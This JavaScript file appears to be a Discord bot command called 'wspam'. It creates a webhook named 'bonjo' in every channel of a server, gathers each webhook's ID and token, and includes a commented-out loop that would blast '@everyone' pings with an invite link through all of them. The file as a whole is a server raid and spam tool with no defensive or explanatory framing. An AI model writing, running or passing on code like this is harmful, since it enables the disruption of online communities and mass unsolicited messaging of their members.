const {webhooks} = require('../functions/getWebhooks'), {createWebhook, sendWebhook} = require('../functions/request')
const sleep = ms => new Promise(resovle => setTimeout(resovle, ms));

module.exports = {
    name: "wspam",
    description: "adds webhook to every channels and spams them",
    func: async function(message, args, client) {
        var webs = await message.guild.channels
        var ws = []
        webs.array().forEach(async(ch) => {
            var wbs = await createWebhook(ch.id, "bonjo")
            console.log(wbs)
            ws.push({id: wbs.id, token: wbs.token})
            await sleep(550)
        })
        console.log(ws)
        /*ws.forEach(wbs => {
            sendWebhook(`https://discord.com/api/webhooks/${wbs.id}/${wbs.token}`, "@everyone https://discord.gg/feur")
        })*/
    }
}